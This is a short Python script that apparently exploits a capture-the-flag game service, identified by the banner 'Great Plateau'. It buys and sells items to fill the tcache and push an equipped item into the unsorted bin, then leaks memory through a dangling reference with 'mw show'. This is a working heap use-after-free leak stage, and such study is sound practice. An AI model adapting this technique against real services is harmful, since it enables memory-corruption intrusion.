#!/usr/bin/env python3
import socket, time, re, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def connect_until_banner(tries=40):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(3)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
s,b=connect_until_banner()
if s is None: print("NO BANNER"); sys.exit(1)
print(b)
# buy 8 swords
for i in range(8):
    cmd(s,"shop buy 0 1",["tx: item added","not enough"])
cmd(s,"inv equip 8",["tx: main world equipped","invalid"])
# sell 7 swords (fill tcache[0xf0])
for i in range(7):
    cmd(s,"shop sell 1",["shop sold","invalid"])
# sell 8th (equipped) -> unsorted bin
o=cmd(s,"shop sell 1",["shop sold","invalid"])
print("[sell 8th] "+o[-120:])
# mw show -> leak
o=cmd(s,"mw show",["Drops:"])
print("[mw show]\n"+o,flush=True)
s.close()
